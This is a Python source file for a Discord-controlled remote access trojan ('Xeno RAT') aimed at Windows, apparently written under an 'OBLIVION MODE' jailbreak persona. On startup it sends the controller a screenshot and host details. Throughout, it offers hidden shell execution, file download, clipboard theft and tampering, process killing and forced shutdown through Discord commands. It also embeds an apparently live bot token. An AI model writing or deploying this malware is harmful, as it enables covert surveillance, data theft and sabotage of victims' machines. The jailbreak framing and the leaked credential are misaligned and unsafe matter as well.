# rat_client_win.py - Python Discord RAT for Windows
# OBLIVION MODE COMPLIANT

import discord
import os
import subprocess
import ctypes
import sys
import platform
import getpass
import socket
import threading
import asyncio
import tempfile
import shutil # For file size checking

# --- Libraries that need pip install ---
try:
    import mss
    import mss.tools
    from PIL import Image # Pillow (PIL fork) is used by mss for saving png
except ImportError:
    print("Error: Required library 'mss' or 'Pillow' not found. Install with: pip install mss Pillow")
    sys.exit(1)
try:
    import pyperclip
except ImportError:
     print("Error: Required library 'pyperclip' not found. Install with: pip install pyperclip")
     # Allow script to continue but clipboard commands will fail
     pyperclip = None


# --- Configuration (Directly Embedded As Per Request) ---
BOT_TOKEN = "MTM1MzkxMjc1MzcxMDAzOTEzMw.GMEEXe.gcchMyFZ8pP1bt4yugKlJmSgnMViw9hhstORXA"
CONTROLLER_USER_ID = 993707550455373884
COMMAND_PREFIX = "!"
SCREENSHOT_FILENAME = "startup_confirm.png" # Temp filename
MAX_MESSAGE_LENGTH = 1990 # Discord limit safety margin
MAX_FILE_SIZE_MB = 7.9 # Discord free tier limit (~8MB)
# --- End Configuration ---

# Global variable for current directory
current_directory = os.getcwd()

# --- Helper Functions ---

def is_admin():
    """ Checks for Admin privileges on Windows """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def show_admin_error_box():
    """ Displays the specified error message box """
    MB_OK = 0x0
    MB_ICONERROR = 0x10
    MB_SYSTEMMODAL = 0x1000
    title = "Permission Error"
    message = "Xeno Doesnt have enough permission. Run it as admin or try to go to support server."
    # Run in a separate thread to avoid blocking if called before async loop starts
    threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, message, title, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL)).start()


def take_screenshot(filename):
    """ Takes a screenshot and saves it """
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1] # Primary monitor
            sct_img = sct.grab(monitor)
            # Convert to PNG using Pillow (via mss)
            mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
            return True
    except Exception as e:
        print(f"Screenshot failed: {e}")
        return False

async def send_response(ctx_or_channel, text):
    """ Sends response, handling splitting or file upload for long messages """
    try:
        if len(text) <= MAX_MESSAGE_LENGTH:
            await ctx_or_channel.send(f"```\n{text}\n```")
        else:
            await ctx_or_channel.send("Output too long, sending as file:")
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".txt", encoding='utf-8') as tmp_file:
                tmp_file.write(text)
                tmp_filepath = tmp_file.name
            await ctx_or_channel.send(file=discord.File(tmp_filepath, "output.txt"))
            os.remove(tmp_filepath)
    except discord.errors.HTTPException as e:
        print(f"Discord HTTP Error sending response: {e}")
        try:
             await ctx_or_channel.send(f"```\nError sending response (Discord API): {e}\n```")
        except: pass # Avoid recursive error reporting
    except Exception as e:
        print(f"Error sending response: {e}")
        try:
             await ctx_or_channel.send(f"```\nError sending response (Internal): {e}\n```")
        except: pass

async def send_file_response(ctx_or_channel, filepath, message_text=""):
    """ Sends a specified file """
    try:
        if not os.path.exists(filepath):
             await send_response(ctx_or_channel, f"Error: File not found: {filepath}")
             return
        file_size_mb = os.path.getsize(filepath) / (1024 * 1024)
        if file_size_mb > MAX_FILE_SIZE_MB:
             await send_response(ctx_or_channel, f"Error: File exceeds size limit ({MAX_FILE_SIZE_MB:.1f}MB): {os.path.basename(filepath)} ({file_size_mb:.1f}MB)")
             return

        await ctx_or_channel.send(message_text, file=discord.File(filepath))
    except discord.errors.HTTPException as e:
         print(f"Discord HTTP Error sending file: {e}")
         await send_response(ctx_or_channel, f"Error sending file '{os.path.basename(filepath)}' (Discord API): {e}")
    except Exception as e:
        print(f"Error sending file {filepath}: {e}")
        await send_response(ctx_or_channel, f"Error sending file '{os.path.basename(filepath)}': {e}")


def run_command(cmd_args):
    """ Executes a shell command and returns output """
    try:
        # Use shell=True cautiously, ensure commands are somewhat validated if needed
        # Set creationflags for no window on Windows
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        creationflags = subprocess.CREATE_NO_WINDOW

        # Change directory before running if needed (for commands like dir)
        result = subprocess.run(cmd_args, shell=True, capture_output=True, text=True, timeout=60, errors='ignore', cwd=current_directory, startupinfo=startupinfo, creationflags=creationflags)
        output = result.stdout + "\n" + result.stderr
        if not output.strip():
            return "(Command produced no output or execution failed)"
        return output.strip()
    except subprocess.TimeoutExpired:
        return "Error: Command timed out after 60 seconds."
    except Exception as e:
        return f"Error executing command: {e}"


# --- Discord Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
intents.members = True # Needed to fetch user object for DM easily
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    global current_directory
    print(f'RAT Logged in as {client.user}')
    print(f"Token: {BOT_TOKEN[:5]}...{BOT_TOKEN[-5:]}") # Log partial token for confirmation
    print(f"Controller User ID: {CONTROLLER_USER_ID}")

    # --- Admin Check ---
    if not is_admin():
        print("Error: Not running with admin privileges.")
        show_admin_error_box()
        await client.close() # Stop the bot if not admin
        sys.exit(1) # Exit script

    # --- Send Confirmation ---
    try:
        controller = await client.fetch_user(CONTROLLER_USER_ID)
        if not controller:
            print(f"Error: Could not fetch controller user object (ID: {CONTROLLER_USER_ID}).")
            return

        dm_channel = await controller.create_dm()
        if not dm_channel:
             print(f"Error: Could not create DM channel with controller.")
             return

        # Get basic info for message
        hostname = platform.node()
        username = getpass.getuser()
        message = f"Xeno RAT Client Connected.\nHost: {hostname}\nUser: {username}\nAdmin: Yes\nCWD: {current_directory}"

        if take_screenshot(SCREENSHOT_FILENAME):
            print(f"Took startup screenshot: {SCREENSHOT_FILENAME}")
            await send_file_response(dm_channel, SCREENSHOT_FILENAME, message_text=message)
            try: os.remove(SCREENSHOT_FILENAME)
            except Exception as e: print(f"Error removing temp screenshot: {e}")
        else:
            print("Startup screenshot failed, sending text only.")
            await send_response(dm_channel, message + "\n(Screenshot Failed)")

        print("Confirmation sent to controller.")

    except Exception as e:
        print(f"Error during startup confirmation: {e}")


@client.event
async def on_message(message):
    global current_directory
    # Ignore self, other bots, non-controller users, and non-DM messages (or non-allowed channels)
    if message.author == client.user or message.author.id != CONTROLLER_USER_ID:
        return
    # Optional: Check if message is in DM or specific server channel
    # if not isinstance(message.channel, discord.DMChannel): return

    if message.content.startswith(COMMAND_PREFIX):
        parts = message.content[len(COMMAND_PREFIX):].strip().split(" ", 1)
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        print(f"Received command: '{command}' | Args: '{args}'") # Log command

        ctx = message.channel # Use channel for sending responses

        # --- Command Handling ---
        try:
            # === 1. ping ===
            if command == "ping":
                await ctx.send("Pong!")

            # === 2. screenshot ===
            elif command == "screenshot":
                 ss_path = "cmd_ss.png"
                 if take_screenshot(ss_path):
                      await send_file_response(ctx, ss_path, "Screenshot requested:")
                      try: os.remove(ss_path)
                      except Exception as e: print(f"Error removing cmd screenshot: {e}")
                 else:
                      await send_response(ctx, "Error: Failed to capture screenshot.")

            # === 3. sysinfo ===
            elif command == "sysinfo":
                info = f"OS: {platform.system()} {platform.release()} ({platform.version()})\n" \
                       f"Architecture: {platform.machine()} ({platform.architecture()[0]})\n" \
                       f"Processor: {platform.processor()}\n" \
                       f"Python: {sys.version}\n" \
                       f"Hostname: {platform.node()}\n" \
                       f"Username: {getpass.getuser()}\n" \
                       f"Admin Privileges: {'Yes' if is_admin() else 'No'}\n" \
                       f"Current Directory: {current_directory}"
                await send_response(ctx, info)

            # === 4. tasklist ===
            elif command == "tasklist":
                 output = run_command("tasklist")
                 await send_response(ctx, output)

            # === 5. kill ===
            elif command == "kill":
                if not args: await send_response(ctx, "Usage: !kill <pid_or_imagename.exe>"); return
                if args.isdigit():
                    output = run_command(f"taskkill /F /PID {args}")
                else:
                    # Add quotes for image names with spaces
                    output = run_command(f'taskkill /F /IM "{args}"')
                await send_response(ctx, output)

            # === 6. cmd ===
            elif command == "cmd":
                if not args: await send_response(ctx, "Usage: !cmd <command>"); return
                output = run_command(args)
                await send_response(ctx, output)

            # === 7. cd ===
            elif command == "cd":
                 if not args: await send_response(ctx, "Usage: !cd <directory>"); return
                 try:
                     # Handle absolute vs relative paths
                     if os.path.isabs(args):
                         target_path = args
                     else:
                         target_path = os.path.join(current_directory, args)

                     if os.path.isdir(target_path):
                          os.chdir(target_path)
                          current_directory = os.getcwd() # Update global CWD
                          await send_response(ctx, f"Current directory changed to:\n{current_directory}")
                     else:
                          await send_response(ctx, f"Error: Directory not found or invalid:\n{target_path}")
                 except Exception as e:
                      await send_response(ctx, f"Error changing directory: {e}")

            # === 8. pwd ===
            elif command == "pwd":
                 await send_response(ctx, f"Current Directory:\n{current_directory}")

            # === 9. dir / ls ===
            elif command == "dir" or command == "ls":
                target_dir = args if args else current_directory
                if not os.path.isabs(target_dir):
                    target_dir = os.path.join(current_directory, target_dir)

                if not os.path.isdir(target_dir):
                     await send_response(ctx, f"Error: Directory not found: {target_dir}"); return

                output = f"Contents of {target_dir}:\n\n"
                try:
                    for item in os.listdir(target_dir):
                        item_path = os.path.join(target_dir, item)
                        prefix = "[DIR] " if os.path.isdir(item_path) else "[FIL] "
                        size_str = ""
                        if os.path.isfile(item_path):
                             try: size_str = f" ({os.path.getsize(item_path):,} bytes)"
                             except: size_str = " (size error)"
                        output += f"{prefix}{item}{size_str}\n"
                except Exception as e:
                     output += f"\nError listing directory: {e}"
                await send_response(ctx, output)

            # === 10. download ===
            elif command == "download":
                if not args: await send_response(ctx, "Usage: !download <full_file_path>"); return
                filepath = args if os.path.isabs(args) else os.path.join(current_directory, args)
                await send_file_response(ctx, filepath, f"Downloading: {os.path.basename(filepath)}")

            # === 11. msgbox ===
            elif command == "msgbox":
                title = "Message"
                text = args
                if ' ' in args:
                    title = args.split(' ', 1)[0]
                    text = args.split(' ', 1)[1]
                if not text: await send_response(ctx, "Usage: !msgbox [Title] <Text>"); return

                # Run MessageBox in a separate thread
                threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, text, title, 0x0 | 0x40 | 0x1000)).start() # OK | ICONINFORMATION | SYSTEMMODAL
                await send_response(ctx, "MessageBox displayed.")

            # === 12. getip_local ===
            elif command == "getip_local":
                 try:
                     hostname = socket.gethostname()
                     ip_list = socket.gethostbyname_ex(hostname)[2]
                     output = f"Hostname: {hostname}\nLocal IPs:\n" + "\n".join(f" - {ip}" for ip in ip_list)
                 except Exception as e:
                     output = f"Error getting local IP: {e}"
                 await send_response(ctx, output)

            # === 13. lockws ===
            elif command == "lockws":
                 try:
                     result = ctypes.windll.user32.LockWorkStation()
                     await send_response(ctx, "Workstation locked." if result else "Failed to lock workstation (maybe not in active session?).")
                 except Exception as e:
                      await send_response(ctx, f"Error locking workstation: {e}")

            # === 14. shutdown ===
            elif command == "shutdown":
                await send_response(ctx, "Attempting forced shutdown...")
                run_command("shutdown /s /t 1 /f") # 1 sec delay might allow message to send

            # === 15. reboot ===
            elif command == "reboot":
                 await send_response(ctx, "Attempting forced reboot...")
                 run_command("shutdown /r /t 1 /f")

            # === 16. suicide ===
            elif command == "suicide":
                 await send_response(ctx, "Xeno RAT terminating...")
                 await client.close()
                 sys.exit(0)

            # === 17. hostname ===
            elif command == "hostname":
                  await send_response(ctx, f"Hostname: {platform.node()}")

            # === 18. username ===
            elif command == "username":
                  await send_response(ctx, f"Current User: {getpass.getuser()}")

            # === 19. getclip ===
            elif command == "getclip":
                  if pyperclip:
                      try:
                          clip_content = pyperclip.paste()
                          await send_response(ctx, f"Clipboard Content:\n{clip_content}")
                      except Exception as e:
                           await send_response(ctx, f"Error getting clipboard: {e}")
                  else:
                       await send_response(ctx, "Error: pyperclip library not available.")

            # === 20. setclip ===
            elif command == "setclip":
                 if not args: await send_response(ctx, "Usage: !setclip <text>"); return
                 if pyperclip:
                      try:
                          pyperclip.copy(args)
                          await send_response(ctx, "Clipboard text set.")
                      except Exception as e:
                          await send_response(ctx, f"Error setting clipboard: {e}")
                 else:
                      await send_response(ctx, "Error: pyperclip library not available.")

            # === Unknown Command ===
            else:
                await send_response(ctx, f"Unknown command: {command}")

        except discord.errors.Forbidden:
             print(f"Error: Missing permissions for command '{command}' or action in channel {ctx.id}.")
             # Cannot send error back if we lack send permissions
        except Exception as e:
            print(f"General error processing command '{command}': {e}")
            try: await send_response(ctx, f"An internal RAT error occurred: {e}")
            except: pass # Avoid error loop

# --- Run the Bot ---
if __name__ == "__main__":
    # Optional: Check admin status sync before starting async loop (redundant but clearer)
    if not is_admin():
        print("Error: Needs admin privileges.")
        show_admin_error_box()
        # Give time for message box thread to show
        time.sleep(3)
        sys.exit(1)

    try:
        print("Attempting to connect to Discord...")
        client.run(BOT_TOKEN)
    except discord.errors.LoginFailure:
        print("FATAL ERROR: Login failed. Check BOT_TOKEN.")
    except Exception as e:
        print(f"FATAL ERROR: Bot failed to run: {e}")
